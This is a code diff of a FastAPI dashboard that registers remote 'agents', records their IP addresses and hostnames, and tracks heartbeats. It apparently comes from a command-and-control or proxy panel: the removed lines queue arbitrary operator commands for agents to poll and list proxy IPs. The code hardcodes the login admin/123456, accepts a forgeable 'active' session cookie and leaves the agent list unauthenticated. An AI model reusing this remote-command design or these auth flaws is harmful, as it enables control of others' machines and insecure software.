@@ -1,18 +1,14 @@
 from fastapi import FastAPI, Request, Form, status
 from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
-from typing import Dict, List
 from datetime import datetime
+from typing import Dict
 
 app = FastAPI()
-
-# ======================
-# Templates
-# ======================
 templates = Jinja2Templates(directory="templates")
 
 # ======================
-# Auth Config
+# إعدادات الدخول
 # ======================
 ADMIN_USER = "admin"
 ADMIN_PASS = "123456"
@@ -21,38 +17,18 @@ def is_logged_in(request: Request) -> bool:
     return request.cookies.get("session") == "active"
 
 # ======================
-# In-Memory Storage
+# تخزين الأجهزة
 # ======================
 agents: Dict[str, dict] = {}
-commands: Dict[str, str] = {}
 
-# مثال Proxies (لاحقًا تُربط بالـ Agents)
-proxies: List[dict] = [
-    {
-        "ip": "83.99.97.77",
-        "port": 5025,
-        "type": "HTTPS",
-        "country": "DZ",
-        "latency": "190 ms",
-        "status": "online"
-    },
-    {
-        "ip": "207.99.178.250",
-        "port": 4195,
-        "type": "HTTP",
-        "country": "DZ",
-        "latency": "45 ms",
-        "status": "online"
-    },
-    {
-        "ip": "69.171.122.204",
-        "port": 2008,
-        "type": "HTTP",
-        "country": "DZ",
-        "latency": "76 ms",
-        "status": "offline"
-    },
-]
+# ======================
+# استخراج IP الحقيقي
+# ======================
+def get_real_ip(request: Request) -> str:
+    forwarded = request.headers.get("x-forwarded-for")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    return request.client.host
 
 # ======================
 # Dashboard
@@ -67,90 +43,61 @@ async def dashboard(request: Request):
 
     return templates.TemplateResponse(
         "index.html",
-        {
-            "request": request,
-            "agents": agents
-        }
+        {"request": request}
     )
 
 # ======================
 # Login / Logout
 # ======================
 @app.post("/login")
-async def login(
-    username: str = Form(...),
-    password: str = Form(...)
-):
+async def login(username: str = Form(...), password: str = Form(...)):
     if username == ADMIN_USER and password == ADMIN_PASS:
-        resp = RedirectResponse(
-            url="/",
-            status_code=status.HTTP_303_SEE_OTHER
-        )
-        resp.set_cookie(
-            key="session",
-            value="active",
-            httponly=True
-        )
+        resp = RedirectResponse("/", status_code=status.HTTP_303_SEE_OTHER)
+        resp.set_cookie("session", "active", httponly=True)
         return resp
-
     return HTMLResponse("Access Denied", status_code=401)
 
 @app.get("/logout")
 async def logout():
-    resp = RedirectResponse(url="/")
+    resp = RedirectResponse("/")
     resp.delete_cookie("session")
     return resp
 
 # ======================
-# Agent API
+# Register Agent (IP حقيقي)
 # ======================
 @app.post("/register")
-async def register_agent(data: dict):
+async def register_agent(request: Request, data: dict):
     agent_id = data.get("agent_id")
     if not agent_id:
-        return JSONResponse(
-            {"error": "agent_id required"},
-            status_code=400
-        )
+        return JSONResponse({"error": "agent_id required"}, status_code=400)
 
-    data["last_seen"] = datetime.now().strftime("%H:%M:%S")
-    data["status"] = "online"
-    agents[agent_id] = data
+    real_ip = get_real_ip(request)
 
-    return {"status": "registered"}
-
-@app.post("/poll")
-async def poll_agent(data: dict):
-    agent_id = data.get("agent_id")
-    if not agent_id:
-        return {"error": "agent_id required"}
-
-    if agent_id in agents:
-        agents[agent_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")
-
-    cmd = commands.pop(agent_id, None)
-    return {"command": cmd} if cmd else {"status": "idle"}
-
-@app.post("/send_command")
-async def send_command(
-    request: Request,
-    agent_id: str = Form(...),
-    command: str = Form(...)
-):
-    if not is_logged_in(request):
-        return RedirectResponse("/", status_code=303)
-
-    commands[agent_id] = command
-    return RedirectResponse("/", status_code=303)
-
-# ======================
-# Proxies API (for UI)
-# ======================
-@app.get("/api/proxies")
-async def get_proxies():
-    return {
-        "total": len(proxies),
-        "shown": len(proxies),
-        "refresh": 5,
-        "proxies": proxies
+    agents[agent_id] = {
+        "agent_id": agent_id,
+        "ip": real_ip,
+        "hostname": data.get("hostname", ""),
+        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "status": "online"
     }
+
+    return {"status": "registered", "ip": real_ip}
+
+# ======================
+# تحديث الحالة
+# ======================
+@app.post("/heartbeat")
+async def heartbeat(request: Request, data: dict):
+    agent_id = data.get("agent_id")
+    if agent_id in agents:
+        agents[agent_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        agents[agent_id]["status"] = "online"
+    return {"status": "ok"}
+
+# ======================
+# API عرض الأجهزة (IP حقيقي فقط)
+# ======================
+@app.get("/api/agents")
+async def get_agents():
+    return list(agents.values())
